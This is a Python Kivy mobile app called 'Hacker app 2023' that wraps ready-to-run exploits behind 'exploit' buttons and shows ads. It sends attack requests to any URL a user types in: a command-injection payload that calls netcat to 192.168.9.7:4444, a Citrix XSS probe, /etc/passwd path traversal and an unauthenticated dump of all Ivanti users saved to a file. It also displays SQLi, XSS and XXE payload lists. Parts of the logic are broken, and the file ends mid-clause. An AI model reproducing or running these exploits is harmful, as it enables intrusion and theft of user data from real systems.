
from kivy.uix.gridlayout import GridLayout
from kivy.uix.popup import Popup
from kivy.uix.button import Button
from kivy.uix.label import Label 
from kivy.uix.floatlayout import FloatLayout 
from kivy.uix.scatter import Scatter
from kivy.uix.textinput import TextInput
from kivymd.uix.filemanager import MDFileManager
from kivymd.toast import toast
from kivymd.uix.toolbar import MDTopAppBar
from kivy.lang import Builder
from kivy.properties import StringProperty, ListProperty
from kivy.core.window import Window
import os
from kivymd.app import MDApp
from kivymd.theming import ThemableBehavior
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.list import OneLineIconListItem, MDList
from kivy.factory import Factory
from kivy.uix.boxlayout import BoxLayout
from kivymd.theming import ThemeManager
from kivymd.uix.bottomsheet import (
    MDCustomBottomSheet,
    MDGridBottomSheet,
    MDListBottomSheet,
)
from sys import exit
from database import DataBase
from kivy.clock import Clock
from kivy.uix.scrollview import ScrollView
from kivy.network.urlrequest import UrlRequest
from kivy.uix.screenmanager import ScreenManager, Screen, WipeTransition
from kivy.uix.actionbar import ActionBar, ActionView, ActionPrevious
from kivy.properties import ObjectProperty
from kivy.uix.anchorlayout import AnchorLayout
from kivy.uix.pagelayout import PageLayout
from kivy.properties import StringProperty, BooleanProperty

from kivmob import KivMob

from threading import Thread
import warnings
import argparse
import urllib.parse
import requests
import random
import base64
import socket
import time
import string
import ssl
from pwn import *
import sys
from bs4 import BeautifulSoup
import re
import xml.etree.ElementTree as ET
import json
################################################################################################################################################################
################################################################################################################################################################
################################################################################################################################################################
#                                                         Login information
################################################################################################################################################################
################################################################################################################################################################
################################################################################################################################################################

with open("main.kv") as kv:
    Builder.load_string(kv.read())

with open("mainmune.kv") as kv:
    Builder.load_string(kv.read())

db = DataBase("users.txt")

def invalidLogin():
    pop = Popup(title='Invalid Login',
                  content=Label(text='Invalid username or password.'),
                  size_hint=(None, None), size=(400, 400))
    pop.open()


def invalidForm():
    pop = Popup(title='Invalid Form',
                  content=Label(text='Please fill in all inputs with valid information.'),
                  size_hint=(None, None), size=(400, 400))

    pop.open()

class LoginMenuScreen(Screen):

    email = ObjectProperty(None)
    password = ObjectProperty(None)

    def loginBtn(self):
        if db.validate(self.email.text, self.password.text):
            ProfileScreen.current = self.email.text
            self.reset()
            self.manager.current = 'MainMenu'
        else:
            invalidLogin()

    def createBtn(self):
        self.reset()
        self.manager.current = 'GuestMenu'

    def reset(self):
        self.email.text = ""
        self.password.text = ""
# Main menu screen class
class MainMenuScreen(Screen):
    pass

# Profile screen class
class ProfileScreen(Screen):
    n = ObjectProperty(None)
    created = ObjectProperty(None)
    email = ObjectProperty(None)
    current = ""

    def logOut(self):
        sm.current = "login"

    def on_enter(self, *args):
        password, name, created = db.get_user(self.current)
        self.n.text = "Account Name: " + name
        self.email.text = "Email: " + self.current
        self.created.text = "Created On: " + created

# About menu screen class
class AboutMenuScreen(Screen):
    pass

# guest menu screen class
class GuestMenuScreen(Screen):
    namee = ObjectProperty(None)
    email = ObjectProperty(None)
    password = ObjectProperty(None)

    def submit(self):
        if self.namee.text != "" and self.email.text != "" and self.email.text.count("@") == 1 and self.email.text.count(".") > 0:
            if self.password != "":
                db.add_user(self.email.text, self.password.text, self.namee.text)
                self.reset()
                self.manager.current = "LoginMenu"
            else:
                invalidForm()
        else:
            invalidForm()

    def login(self):
        self.reset()
        self.manager.current = "LoginMenu"

    def reset(self):
        self.email.text = ""
        self.password.text = ""
        self.namee.text = ""


################################################################################################################################################################
################################################################################################################################################################
################################################################################################################################################################
################################################################################################################################################################
################################################################################################################################################################

class ItemBackdropBackLayer(ThemableBehavior):
    icon = StringProperty("android")
    text = StringProperty()
    selected_item = BooleanProperty(False)

    def on_touch_down(self, touch):
        if self.collide_point(touch.x, touch.y):
            for item in self.parent.children:
                if item.selected_item:
                    item.selected_item = False
            self.selected_item = True
        return super().on_touch_down(touch)

class ContentNavigationDrawer(MDBoxLayout):
    pass

################################################################################################################################################################
################################################################################################################################################################
################################################################################################################################################################
#                                                         ads adsssssssss
################################################################################################################################################################
################################################################################################################################################################
################################################################################################################################################################



class Hacker(MDApp):
    def build(self):
        self.title = "Hacker app 2023"
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "Orange"
        #Window.size = (400,600)

        self.root = ScreenManager()
        # Login menu screen
        self.LoginMenuScreen = LoginMenuScreen(name='LoginMenu')
        self.root.add_widget(self.LoginMenuScreen)

        # Main menu screen
        self.MainMenuScreen = MainMenuScreen(name='MainMenu')
        self.root.add_widget(self.MainMenuScreen)

        # About menu screen
        self.AboutMenuScreen = AboutMenuScreen(name='AboutMenu')
        self.root.add_widget(self.AboutMenuScreen)

        # Profile screen
        self.ProfileScreen = ProfileScreen(name='Profile')
        self.root.add_widget(self.ProfileScreen)

        # Guest menu screen
        self.GuestMenuScreen = GuestMenuScreen(name='GuestMenu')
        self.root.add_widget(self.GuestMenuScreen)

        self.root.current = 'LoginMenu'


        self.ads = KivMob('ca-app-pub-9960257549650503~6312183713')
        self.ads.new_banner('ca-app-pub-9960257549650503/8756605840')
        self.ads.request_banner()
        self.ads.show_banner()

        #self.root = Factory.BottomSheet()
        return self.root

    def interstitial(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()

    def REWARDED_VIDEO(self):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
 
    def show_example_bottom_sheet(self):
        bs_menu = MDListBottomSheet()
        bs_menu.add_item(
            "about my self",
            lambda x: self.callback_for_menu_items("Here's an item with text only"),
        )
        bs_menu.add_item(
            "my name is tahnoon",
            lambda x: self.callback_for_menu_items("tahnoon"),
            icon="img/my.png",
        )
        bs_menu.add_item(
            "my phone number : +967775796741",
            lambda x: self.callback_for_menu_items("+967775796741"),
            icon="phone",
        )
        bs_menu.open()

##########################################################################################################
##########################################################################################################
##########################################################################################################
##########################################################################################################

    def show_example_grid_bottom_sheet(self):
        bs_menu = MDGridBottomSheet()
        bs_menu.add_item(
            "Facebook",
            lambda x: self.facsebook(),
            icon_src ="facebook",
        )
        bs_menu.add_item(
            "YouTube",
            lambda x: self.youtube(),
            icon_src="youtube",
        )
        bs_menu.add_item(
            "Twitter",
            lambda x: self.twitter(),
            icon_src="twitter",
        )
        bs_menu.add_item(
            "Da Cloud",
            lambda x: self.Cloud(),
            icon_src="cloud-upload",
        )
        bs_menu.add_item(
            "Camera",
            lambda x: self.camera(),
            icon_src="camera",
        )
        bs_menu.open()

    def facsebook(self):
        import webbrowser
        webbrowser.open('https://www.facebook.com')
    def youtube(self):
        import webbrowser
        webbrowser.open('https://www.youtube.com')
    def twitter(self):
        import webbrowser
        webbrowser.open('https://www.twitter.com')
    def Cloud(self):
        import webbrowser
        webbrowser.open('https://www.facebook.com')
    def camera(self):
        import webbrowser
        webbrowser.open('https://www.camera.com')


  ##########################################################################################################
##########################################################################################################
##########################################################################################################
##########################################################################################################
#############################################################################################
#############################################################################################
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        Window.bind(on_keyboard=self.events)
        self.manager_open = True
        self.file_manager = MDFileManager(
            exit_manager=self.exit_manager,
            select_path=self.select_path,
            #previous=True,
        )


    def file_manager_open(self):
        self.file_manager.show('/')  # output manager to the screen
        self.manager_open = True

    def select_path(self, path):
        '''It will be called when you click on the file name
        or the catalog selection button.

        :type path: str;
        :param path: path to the selected directory or file;
        '''

        self.exit_manager()
        toast(path)

    def exit_manager(self, *args):
        '''Called when the user reaches the root of the directory tree.'''

        self.manager_open = True
        self.file_manager.close()
    
    def events(self, instance, keyboard, keycode, text, modifiers):
        '''Called when buttons are pressed on the mobile device.'''

        if keyboard in (1001, 27):
            if self.manager_open:
                self.file_manager.back()
        return True

##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       show_all_injection_sql show_all_injection_sql show_all_injection_sql             #
#                                                                                                        #
##########################################################################################################
##########################################################################################################

    def show_all_injection_sql(self):
        layout = GridLayout(cols = 1)
        closeButton = Button(text = "Exit",size_hint =(None, None), size =(60, 40), background_color=(1, 0, 0, 1))
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        layout.add_widget(closeButton)       
        popup = Popup(title ='show sql Injection',content = layout)
        t = TextInput(text = open(r"file/sql-injection-payload-list.txt", "r").read(),font_size = 15,size_hint_y = None,height = 499) 
        layout.add_widget(t)
        popup.open()   
        closeButton.bind(on_press = popup.dismiss)
    def show_all_injection_ssx(self):
        layout = GridLayout(cols = 1)
        closeButton = Button(text = "Exit",size_hint =(None, None), size =(60, 40), background_color=(1, 0, 0, 1))
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        layout.add_widget(closeButton)       
        popup = Popup(title ='show xss Injection',content = layout)
        t = TextInput(text = open(r"file/xss-injection.txt", "r").read(),font_size = 15,size_hint_y = None,height = 499) 
        layout.add_widget(t)
        popup.open()   
        closeButton.bind(on_press = popup.dismiss) 
    def show_all_injection_command(self):
        layout = GridLayout(cols = 1)
        closeButton = Button(text = "Exit",size_hint =(None, None), size =(60, 40), background_color=(1, 0, 0, 1))
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        layout.add_widget(closeButton)       
        popup = Popup(title ='show command Injection',content = layout)
        t = TextInput(text = open(r"file/Command-injection.txt", "r").read(),font_size = 15,size_hint_y = None,height = 499) 
        layout.add_widget(t)
        popup.open()   
        closeButton.bind(on_press = popup.dismiss) 
    def show_all_injection_xml(self):
        layout = GridLayout(cols = 1)
        closeButton = Button(text = "Exit",size_hint =(None, None), size =(60, 40), background_color=(1, 0, 0, 1))
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        layout.add_widget(closeButton)       
        popup = Popup(title ='show xml Injection',content = layout)
        t = TextInput(text = open(r"file/xxe-injection-payload-list.txt", "r").read(),font_size = 15,size_hint_y = None,height = 499) 
        layout.add_widget(t)
        popup.open()   
        closeButton.bind(on_press = popup.dismiss) 
    def show_all_injection_ssrf(self):
        layout = GridLayout(cols = 1)
        closeButton = Button(text = "Exit",size_hint =(None, None), size =(60, 40), background_color=(1, 0, 0, 1))
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        layout.add_widget(closeButton)       
        popup = Popup(title ='show ssrf Injection',content = layout)
        t = TextInput(text = open(r"file/server-side-injection.txt", "r").read(),font_size = 15,size_hint_y = None,height = 499) 
        layout.add_widget(t)
        popup.open()   
        closeButton.bind(on_press = popup.dismiss)  

##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       file_cve_sql file_cve_sql file_cve_sql                                           #
#                                                                                                        #
##########################################################################################################
##########################################################################################################

    def file_cve_sql(self):
        self.layout = GridLayout(cols = 1)
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.popupLabel = Button(text = "Enter url ex. (https://google.com/) :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.popup = Popup(title ='exploit Buffer Overflow 500',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 

        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.layout.add_widget(self.closeButton)       
        self.exploitButton.bind(on_press = self.exploit)

        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)

##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       apache_range_dos apache_range_dos apache_range_dos                               #
#                                                                                                        #
##########################################################################################################
##########################################################################################################

    def apache_range_dos(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.popupLabel = Button(text = "Enter url ex. (https://google.com/) :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.popup = Popup(title ='exploit Buffer Overflow 500',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 

        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.layout.add_widget(self.closeButton)       
        self.exploitButton.bind(on_press = self.exploit)

        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        url = self.t.text
        payload = '4\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n0\r\n4\r\n'
        headers = {
          'Content-Type': 'multipart/form-data; boundary=4'
        }
        try:
            response = requests.request("POST", url, headers=headers, data=payload)
            if response.status_code == 500:
                self.res = Label(text = "Buffer Overflow is yes",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                self.res2 = TextInput(text = response.text ,font_size = 20,size_hint_y = None, height = 400)
                self.layout.add_widget(self.res2)
            else :
                self.res = Label(text = "Buffer Overflow is no",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                self.res2 = TextInput(text = response.text ,font_size = 20,size_hint_y = None, height = 400)
                self.layout.add_widget(self.res2)
        except requests.exceptions.Timeout:
            self.res = Label(text = f'Timeout on host {url}, moving on to next host',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Label(text = f'Error on host {url}: {e}',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       Apache_Struts2 Apache_Struts2 Apache_Struts2                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################

    def Apache_Struts2(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter domin ex. (google.com) :",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='exploit Apache Struts2 command',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.Apache_Struts2_exploit)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def Apache_Struts2_exploit(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        host = self.t.text
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        payload = f"$(echo -n \"';nc 192.168.9.7 4444 #'\" | base64)"
        data = {
            'args_reason': 'filetypewarn',
            'url': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
            'filetype': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
            'user': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
            'user_encoded': payload
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "curl/8.0.1"
        }

        try:
            response = requests.post(f'https://{host}/index.php?c=blocked&action=continue', headers=headers, data=data, timeout=30)
            if response.status_code == 200:
                self.res = Button(text = f'Host {host} has been exploited',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                self.res2 = TextInput(text = response.text ,font_size = 20,size_hint_y = None, height = 400)
                self.layout.add_widget(self.res2)
            else :
                self.res = Button(text = f'Host {host} has been not exploited',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                self.res2 = TextInput(text = response.text ,font_size = 20,size_hint_y = None, height = 400)
                self.layout.add_widget(self.res2)
        
        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {host}, moving on to next host',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {host}: {e}',size_hint =(None, None), size =(200, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)

##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_24488 xxsssssssssssssssssssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_24488(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter url ex.( https://google.com/ ):",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='exploit xss  CVE-2023-24488',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.CVE_2023_24488_exploit)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def CVE_2023_24488_exploit(self,obj):
        target_url = self.t.text
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        path = "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>"

        try:
            response = requests.get(target_url + path)
            self.res2 = TextInput(text = response.text ,font_size = 20,size_hint_y = None, height = 200)
            self.layout.add_widget(self.res2)
            self.ress = Button(text = 'Vulnerable to CVE-2023-24488: Citrix Gateway and Citrix ADC - Cross-Site Scripting',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.resw = Button(text = 'Not vulnerable to CVE-2023-24488',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1), background_color=(1, 0, 0, 1))
            if ("<script>alert(document.domain)</script>" in response.text and "content-type: text/html" in response.headers.get("Content-Type", "").lower() and response.status_code == 404):
                return True ,self.layout.add_widget(self.ress)
            return False ,self.layout.add_widget(self.resw)
  
        
        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {target_url}, moving on to next host',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {target_url}: {e}',size_hint =(None, None), size =(200, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_25136 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_25136(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter url and port ex.( https://google.com:443/ ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='exploit remote code execution CVE-2023-25136',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_25136)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_25136(self,obj):
        ip = self.t.text
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        url = ip + "/app?service=page/SetupCompleted"

        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            text_div = soup.find('div', class_='text')
   # product_span = text_div.find('span', class_='product')

    # Search for the first span element containing a version number
            version_span = None

            if version_span is None:
                self.ress = Button(text = 'Not Vulnerable',size_hint =(None, None), size =(200, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.ress)
                print('Not Vulnerable')
            for span in text_div.find_all('span'):
                version_match = re.match(r'^\d+\.\d+\.\d+$', span.text.strip())
                if version_match:
                    version_span = span
                    break
            else:
                version_str = version_span.text.strip()
                self.ress = Button(text = 'Version:',size_hint =(None, None), size =(200, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.ress)
                self.res2 = TextInput(text = version_str ,font_size = 20,size_hint_y = None, height = 200)
                self.layout.add_widget(self.res2)
                self.ress2 = Button(text = 'Vulnerable version',size_hint =(None, None), size =(200, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.ress2)
                self.ress3 = Button(text = 'f"Step 1 visit this url first in your browser: {url}"',size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.ress3)
  
        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {url}, moving on to next host',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {url}: {e}',size_hint =(None, None), size =(200, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
    
##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_25136 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_26256(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter url ex.( https://www.google.com/ ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='exploit remote code CVE_2023_26256',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.CVE_2023_26256_exploit)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def CVE_2023_26256_exploit(self,obj):
        ip = self.t.text
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        }
        url1 = ip + "/plugins/servlet/snjFooterNavigationConfig?fileName=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&fileMime=$textMime"
        url2 = ip + "/plugins/servlet/snjCustomDesignConfig?fileName=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&fileMime=$textMime"
        try:
            res1 = requests.get(url1,headers=headers,verify=False,timeout=5)
            res2 = requests.get(url2, headers=headers, verify=False, timeout=5).text
            self.res2 = TextInput(text = res1.text ,font_size = 20,size_hint_y = None, height = 300)
            self.layout.add_widget(self.res2)
            if "root" in res1 or "root" in res2:
                self.r1 = Button(text = f"[+] {ip} is vulnable!",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.r1)
            else:
                self.res1 = Button(text = f"[+] {ip} is not vulnable!",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1), background_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res1)

        except requests.exceptions.Timeout:
            self.res = Button(text = f'Timeout on host {ip}, moving on to next host',size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
        except requests.exceptions.RequestException as e:
            self.res = Button(text = f'Error on host {ip}: {e}',size_hint =(None, None), size =(200, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)

##########################################################################################################
##########################################################################################################
#                                                                                                        #
#                       CVE_2023_35078 comsssssssssssssss ssssssssss                                     #
#                                                                                                        #
##########################################################################################################
##########################################################################################################
    def CVE_2023_35078(self):
        self.ads.new_interstitial('ca-app-pub-9960257549650503/3307099938')
        self.ads.request_interstitial()
        self.ads.show_interstitial()
        self.layout = GridLayout(cols = 1)
        self.popupLabel = Button(text = "Enter url ex.( https://www.google.com/ ):",size_hint =(None, None), size =(350, 30), outline_color=(1, 0, 0, 1))
        self.popup = Popup(title ='Remote Unauthenticated API Access Vulnerability CVE_2023_35078',content = self.layout)
        self.t = TextInput(font_size = 20,size_hint_y = None,height = 40,multiline=True) 
        self.exploitButton = Button(text = "[exploit]",size_hint =(None, None), size =(70, 40), background_color=(1, 0, 0, 1))
        self.closeButton = Button(text = "Exit",size_hint =(None, None), size =(70, 30), background_color=(1, 0, 0, 1))
        self.layout.add_widget(self.popupLabel)

        self.layout.add_widget(self.t)
        self.layout.add_widget(self.exploitButton)
        self.exploitButton.bind(on_press = self.exploit_CVE_2023_35078)
        self.layout.add_widget(self.closeButton)
        self.popup.open()   
        self.closeButton.bind(on_press = self.popup.dismiss)
    def exploit_CVE_2023_35078(self,obj):
        self.ads.load_rewarded_ad("ca-app-pub-9960257549650503/3307099938")
        self.ads.show_rewarded_ad()
        url = self.t.text
        try:
            r = requests.get(url, verify=False)
            if r.status_code == 200:
            # Get the version from the HTML
                version_start = r.text.find("ui.login.css?")
                if version_start != -1:
                    version_end = r.text.find('"', version_start)
                    version = r.text[version_start + len("ui.login.css?"):version_end]
                    self.res = Button(text = f"[*] Target version: {version}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                    self.layout.add_widget(self.res)
                    #print(f"[*] Target version: {version}")
                    if version <= "11.4":
                        self.res = Button(text = f"[+] Target is vulnerable! {url}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                        self.layout.add_widget(self.res)
                        return True
                    else:
                        self.res = Button(text = f"[-] Target is not vulnerable! {url}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                        self.layout.add_widget(self.res)
                        return False
                else:
                    self.res = Button(text = f"[-] Target is not vulnerable! {url}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                    self.layout.add_widget(self.res)
            else:
                self.res = Button(text = f"[-] Target is not vulnerable! {url}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
        except Exception as e:
            self.res = Button(text = f"[-] Error occurred: {str(e)}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)

        vuln_url = url + "/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1"
        print(f"[*] Exploiting the target... {url}")
        try:
            r = requests.get(vuln_url, verify=False)
            if r.status_code == 200:
                self.res = Button(text = "[+] Extracting Data:",size_hint =(None, None), size =(300, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                self.res = Button(text = f"[*] Dumping all users from {vuln_url}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                print("[+] Extracting Data:")
                print(f"[*] Dumping all users from {vuln_url}")
            # Save JSON response to a file with 'utf-8' encoding
            # Create a file name with the target URL
                filename = url.split("//")[1].split("/")[0] + ".json"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(r.text)
                self.res = Button(text = f"[+] Data saved to file: {filename}",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                self.res = Button(text = "[+] Vulnerability Exploited Successfully!",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
                #print("[+] Data saved to file: " + filename)
   
            else:
                self.res = Button(text = "[-] Exploit failed. The target is not vulnerable.",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
                self.layout.add_widget(self.res)
        except Exception as e:
            self.res = Button(text = "[-] Exploit failed. The target is not vulnerable.",size_hint =(None, None), size =(400, 30), outline_color=(1, 0, 0, 1))
            self.layout.add_widget(self.res)
            print(f"[-] Error occurred: {str(e)}")
        except requests.exceptions.Timeout:
